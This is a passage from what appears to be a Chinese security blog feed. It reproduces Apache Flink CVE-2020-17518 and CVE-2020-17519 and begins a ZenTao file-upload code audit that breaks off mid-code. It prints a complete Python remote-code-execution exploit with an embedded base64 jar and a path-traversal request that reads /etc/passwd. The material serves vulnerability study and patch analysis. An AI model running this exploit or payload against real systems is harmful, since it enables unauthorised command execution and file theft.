a6MnClp0epJh0fbfUEsDBAoAAAgAACJ1bU8AAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAQI&#x2F;ABQAAAAIAASBJlLHe4y+9gIAAOgEAAANACQAAAAAAAAAIAAAAAAAAABFeGVjdXRlLmNsYXNzCgAgAAAAAAABABgAsQeXEAPk1gFyshItA+TWAdyLEi0D5NYBUEsBAgoACgAACAAAInVtTwAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAIQMAAE1FVEEtSU5GL1BLAQIUABQACAgIACJ1bU+Iigi&#x2F;MAAAAC4AAAAUAAQAAAAAAAAAAAAAAEgDAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwUGAAAAAAMAAwDcAAAAvgMAAAAA</span><br></pre></td></tr></table></figure><p>link运行时文件都在/tmp目录下，路径类似于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#x2F;</span><br></pre></td></tr></table></figure><p>每台服务器运行Flink时路径都不同，因此要先获取该路径。</p><p>通过接口<code> /jobmanager/config</code> 则可以获取<code>web.tmpdir</code>的路径。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194913.png"></p><p>我这里为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-2dc398da-fb29-4250-b9ef-68afe0dd08ab</span><br></pre></td></tr></table></figure><p>上传jar包到<code>/tmp/flink-web-2dc398da-fb29-4250-b9ef-68afe0dd08ab/flink-web-upload/</code>目录下，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194914.png"></p><p>执行命令，反弹shell。</p><p>我手动复现了三次都没成功，用expdb里的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Apache Flink 1.9.x - File Upload RCE (Unauthenticated)</span></span><br><span class="line"><span class="comment"># Google Dork: None</span></span><br><span class="line"><span class="comment"># Date: 2020.11.01</span></span><br><span class="line"><span class="comment"># Exploit Author: bigger.wing</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://flink.apache.org/</span></span><br><span class="line"><span class="comment"># Software Link: https://flink.apache.org/downloads.html</span></span><br><span class="line"><span class="comment"># Version: 1.9.x</span></span><br><span class="line"><span class="comment"># Tested on: Centos7.x, 1.9.1</span></span><br><span class="line"><span class="comment"># CVE: None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlinkRCECheck</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.timeout = <span class="number">10</span></span><br><span class="line">        self.upload_file = <span class="string">&#x27;rce_check_from_sec.jar&#x27;</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                          <span class="string">&#x27;Chrome/61.0 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_version</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            version = res.json().get(<span class="string">&#x27;flink-version&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            version = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> version</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_check</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;jars&#x27;</span>)</span><br><span class="line">        jar_list = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url, headers=self.headers, verify=<span class="literal">False</span>, timeout=self.timeout)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">                res = res.json()</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> res[<span class="string">&#x27;files&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">if</span> file[<span class="string">&#x27;id&#x27;</span>].endswith(self.upload_file):</span><br><span class="line">                        jar_list.append(file[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jar_list</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_upload</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;jars/upload&#x27;</span>)</span><br><span class="line">        jar_content = base64.b64decode(<span class="string">&#x27;UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALg&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAA&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAK&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;VkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLv&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;CGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujC&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;QNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJN&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;aFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Q&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;o0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNM&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;KA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjo&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;RF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqp&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;s0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJ&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;cVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEs&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;OJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6Ejpt&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;I4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IO&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;Yg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1b&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;U+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSw&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;ECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQ&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUG&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAAAAMAAwC4AAAArgQAAAAA&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;jarfile&#x27;</span>: (self.upload_file, io.BytesIO(jar_content), <span class="string">&#x27;application/octet-stream&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url, headers=self.headers, files=files, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            file_id = res.json()[<span class="string">&#x27;filename&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">return</span> file_id</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="comment"># delete history jar packages</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_delete</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> jar_name <span class="keyword">in</span> self.jar_check:</span><br><span class="line">            url = <span class="string">&#x27;%s//jars/%s&#x27;</span> % (self.url, jar_name)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.delete(url=url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">self, command</span>):</span></span><br><span class="line">        jar_file = self.jar_upload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            execute_cmd_url = <span class="string">&#x27;%s/jars/%s/run?entry-class=Execute&amp;program-args=&quot;%s&quot;&#x27;</span> % (self.url, jar_file, command)</span><br><span class="line">            res = requests.post(url=execute_cmd_url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            res = re.findall(<span class="string">&#x27;\|@\|(.*?)\|@\|&#x27;</span>, res.text)[<span class="number">0</span>][<span class="number">0</span>:<span class="number">-2</span>]</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                print(<span class="string">&#x27;rce command &quot;%s&quot; exec result: %s&#x27;</span> % (command, res))</span><br><span class="line">                state = <span class="number">1</span></span><br><span class="line">                msg = <span class="string">&#x27;%s rce success&#x27;</span> % self.url</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                state = <span class="number">0</span></span><br><span class="line">                msg = <span class="string">&#x27;%s rce failed&#x27;</span> % self.url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            state = <span class="number">0</span></span><br><span class="line">            msg = <span class="string">&#x27;%s rce failed&#x27;</span> % self.url</span><br><span class="line"></span><br><span class="line">        delete = self.jar_delete</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;state&#x27;</span>: state, <span class="string">&#x27;version&#x27;</span>: self.get_version, <span class="string">&#x27;msg&#x27;</span>: msg&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    usage = <span class="string">&#x27;python3 script.py ip port command&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;simple usage: %s&#x27;</span> % usage)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        command = sys.argv[<span class="number">3</span>]</span><br><span class="line">        url = <span class="string">&#x27;http://%s:%s&#x27;</span> % (ip, port)</span><br><span class="line">        res = FlinkRCECheck(url=url).rce(command=command)</span><br><span class="line">        print(res)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>原来是要<code>1.9.x</code> 版本的。这里的版本是1.11.x了。懂怎么用就行了。。老sb了。</p><h2 id="CVE-2020-17519-任意文件读取漏洞"><a href="#CVE-2020-17519-任意文件读取漏洞" class="headerlink" title="CVE-2020-17519 任意文件读取漏洞"></a>CVE-2020-17519 任意文件读取漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194915.png"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>亘古不变的升级到最新版。（x。那这还学个屁。跟着commi ，简单分析下不香？</p><p>对<code>../</code>进行了处理。希望不会像其他洞一样出现绕过的情况 :call_me_hand:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118200807.png"></p><p>后面还对上传的文件大小、内容进行了一些判断，。代码太长了不想看。</p><p><strong>我分析错了。</strong>具体看看：</p><p><a href="https://www.anquanke.com/post/id/228507#h3-10">https://www.anquanke.com/post/id/228507#h3-10</a></p><p><a href="https://xz.aliyun.com/t/9023">https://xz.aliyun.com/t/9023</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4">https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518">https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518</a></p><p><a href="https://www.anquanke.com/post/id/227630">https://www.anquanke.com/post/id/227630</a></p><p><a href="https://www.freebuf.com/vuls/260257.html">https://www.freebuf.com/vuls/260257.html</a></p><p><a href="https://www.exploit-db.com/exploits/48978">https://www.exploit-db.com/exploits/48978</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;2021年01月06日，Apache Flink&lt;code&gt;发布了&lt;/code&gt;Apache Flink 目录穿越漏洞,目录</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>代码审计：CNVD-C-2020-121325：禅道后台文件上传漏洞</title>
    <link href="https://hack-for.fun/c5f5.html"/>
    <id>https://hack-for.fun/c5f5.html</id>
    <published>2021-01-15T03:31:29.000Z</published>
    <updated>2021-01-16T06:02:35.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>禅道是第一款国产的开源项目管理软件，其使用zentaophp框架开发，内置了测试管理、计划管理、发布管理、文档管理、事务管理等产品管理和项目管理功能，并为每一个页面提供json接口的api，方便与其它语言调用交互。内置多语言、多风格、搜索功能、统计功能等多种实用功能。</p><p>2020年10月14日，禅道官网发布安全公告，禅道开源项目管理软件中存在一个文件上传漏洞（CNVD-C-2020-121325）。<strong>攻击者可以通过fopen/fread/fwrite方法结合File、FTP等协议读取或上传任意文件。成功利用此漏洞的攻击者可获得目标系统敏感文件及系统管理权限。</strong></p><p>影响版本：</p><ul><li>禅道开源版12.3.3、12.4.1、12.4.2</li><li>禅道:禅道开源版&lt;=12.4.2</li></ul><blockquote><p>漏洞只适用于Windows一键安装版（未加安全限制）、Linux一键安装版（未加安全限制）、安装包版。Windows/Linux一键安装版(加入安全限制)由于做过新上传文件限制，无法执行上传后的文件，导致漏洞无法利用。</p></blockquote><p>利用条件：需要后台权限</p><p>禅道开源版12.4.2下载地址：<a href="https://www.zentao.net/download/zentaopms12.4.2-80263.html">https://www.zentao.net/download/zentaopms12.4.2-80263.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;www.zentao.net&#x2F;dl&#x2F;zentao&#x2F;12.4.2&#x2F;ZenTaoPMS.12.4.2.zip</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>环境：</p><p>OS：MacOS</p><p>PHP：5.4.45</p><p>MySQL：5.7.26</p><p>将下载好的源码，放到MAMP PRO的hosts的Document目录即可启动环境。</p><p>访问 <a href="http://zentaopms:8890/www/install.php">http://zentaopms:8890/www/install.php</a> 即可安装禅道</p><p>安装完成后，设置账号密码为弱口令，禅道的安全策略会让用户强制改密码(我改为了Admin@123)，这一点很不错。因为这个漏洞发生在后台，如果没办法进后台，就没办法利用。</p><p>其他都默认即可。</p><h2 id="利用方法一"><a href="#利用方法一" class="headerlink" title="利用方法一"></a>利用方法一</h2><p>12.4.2 和 12.4.3 代码对比：</p><p><code>module/client/ext/model/xuanxuan.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000837.png"></p><p>新增代码如下：即对文件名的扩展名进行了校验。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file      = basename($link);</span><br><span class="line">$extension = substr($file, strrpos($file, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>正常情况下，获取文件名后缀，可以看到，如果是非法后缀，都直接返回<code>txt</code></p><p><code>/module/file/model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get extension of a file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string    $filename</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getExtension</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $extension = trim(strtolower(pathinfo($filename, PATHINFO_EXTENSION)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension) <span class="keyword">or</span> stripos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;dangers&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) !== <span class="literal">false</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension) <span class="keyword">or</span> stripos(<span class="string">&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;</span>, <span class="string">&quot;,&#123;$extension&#125;,&quot;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>($extension == <span class="string">&#x27;php&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $extension;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进父类<code>downloadZipPackage</code> 方法</p><p><code>/module/client/model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Download zip package.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $version</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $link</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool | string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params">$version, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($version) || <span class="keyword">empty</span>($link)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    $dir  = <span class="string">&quot;data/client/&quot;</span> . $version . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    $link = helper::safe64Decode($link);</span><br><span class="line">    $file = basename($link);</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir))</span><br><span class="line">    &#123;</span><br><span class="line">        mkdir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir . $file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> commonModel::getSysURL() . 